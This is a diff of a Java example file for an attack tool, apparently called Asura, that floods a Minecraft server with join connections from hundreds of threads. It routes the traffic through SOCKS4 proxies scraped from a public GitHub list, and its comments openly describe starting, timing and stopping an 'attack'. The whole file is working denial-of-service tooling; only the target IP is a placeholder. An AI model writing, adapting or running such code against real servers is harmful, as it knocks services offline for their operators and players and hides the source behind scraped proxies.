@@ -1,55 +1,51 @@
 package test;
 
-import java.net.MalformedURLException;
-import java.util.ArrayList;
-
-import dev.lastknell.core.AttackConfig;
 import dev.lastknell.core.NettyBootstrap;
 import dev.lastknell.core.methods.IMethod;
 import dev.lastknell.core.methods.impl.Join;
 import dev.lastknell.core.proxy.Proxy;
 import dev.lastknell.core.proxy.ProxyManager;
-import dev.lastknell.core.proxy.ProxyScraper;
+import dev.lastknell.core.proxy.util.ProxyScraper;
+import dev.lastknell.core.proxy.util.ProxyType;
+
+import java.net.MalformedURLException;
+import java.util.ArrayList;
+
+import static java.lang.Thread.sleep;
 
 public class AsuraExample {
 
     // how asura work
     /*
-     * for each attack u make a attack config
-     * then u make a proxy manager whith a list of proxies to use in
-     * attack(Arraylist of dev.lastknell.Proxy)
-     * proxy scraper helps u to get ArrayList of Proxy easily and scrapes proxies
-     * from ArrayList of urls
-     * then for each attack u make a nettybootstrap and give it attack config and
-     * proxy manager as input
+     * for each attack u make a new object of NettyBootstrap
+     * then u make a proxy manager with a list of proxies to use in attack(Arraylist of dev.lastknell.Proxy)
+     * proxy scraper helps u to scrape proxies and get ArrayList of dev.lastknell.Proxy from a ArrayList of urls(String)
+     * use nettybootstrap start() method to start attack
+     * and stop() method to stop attack
      */
 
     public static void main(String[] args) {
-        // Define necessary variables
         String srvIP = "0.0.0.0";
         int port = 25565;
         IMethod method = new Join();
-        int protocolID = 760;
-        int perDelay = 10; // connections per delay
-        int duration = 100; // attack duration
-        int delay = 100; // delay b/w each loop in loop threads in ms
-        int loopThreads = 3; // these thread ask worker threads to send connection in a loop
-        int workerThreads = 256; // these threads send connection
-        int proxyType = 0; // 0 -> Socks4Proxy, 1 -> Socks5Proxy, 2 -> HttpProxy
-        boolean usingEpoll = true; // gives high performance in linux
-
-        // Make a AttackConfig
-        AttackConfig config = new AttackConfig(srvIP, port, method, protocolID, duration, perDelay, delay, loopThreads,
-                workerThreads, proxyType, usingEpoll);
-
         // setup nettybootstrap
-        NettyBootstrap bootstrap = new NettyBootstrap(config, makeProxtManager());
+        NettyBootstrap bootstrap = new NettyBootstrap.Builder(method, srvIP, port)
+                .connectLoopThreads(3)
+                .workerThreads(256)
+                .proxyType(ProxyType.SOCKS4)
+                .delay(100) //in ms
+                .perDelay(10) // connections per delay
+                .duration(100) //attack duration
+                .protocolID(760) //miecraft version protocol id
+                .proxyManager(makeProxyManager()) //proxy manager
+                .usingEpoll(true) // gives high performance in linux if true
+                .build();
 
         // start attack
         bootstrap.start();
 
-        // stop attack
-        // bootstrap.stop();
+        // stop attack if u want anytime (before duration)
+        bootstrap.stop();
 
         // u can print or use live updated values in bootstrap
         while (!bootstrap.shouldStop) {
@@ -57,7 +53,7 @@ public class AsuraExample {
             // sleep for 1000 sec as CPS updates every sec so no use to see its value
             // between a interval if sec
             try {
-                Thread.sleep(1000);
+                sleep(1000);
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
@@ -65,21 +61,22 @@ public class AsuraExample {
 
     }
 
-    public static ProxyManager makeProxtManager() {
-        ArrayList<String> urls = new ArrayList<String>();
+    //a function to make ProxyManager
+    public static ProxyManager makeProxyManager() {
+        ArrayList<String> urls = new ArrayList<>();
+        //now add all urls u want to scrape proxyes from in this list
         urls.add("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt");
-        ArrayList<Proxy> proxies = new ArrayList<Proxy>();
+        ArrayList<Proxy> proxies = new ArrayList<>();
         try {
             ProxyScraper scraper = new ProxyScraper(urls);
             // scrape proxies from links
             scraper.scrape();
             // get proxies
-            proxies = scraper.getProxies();
+            proxies = new ArrayList<>(scraper.getProxies());
         } catch (MalformedURLException e) {
             e.printStackTrace();
         }
         // make proxy manager
-        ProxyManager manager = new ProxyManager(proxies);
-        return manager;
+        return new ProxyManager(proxies);
     }
 }
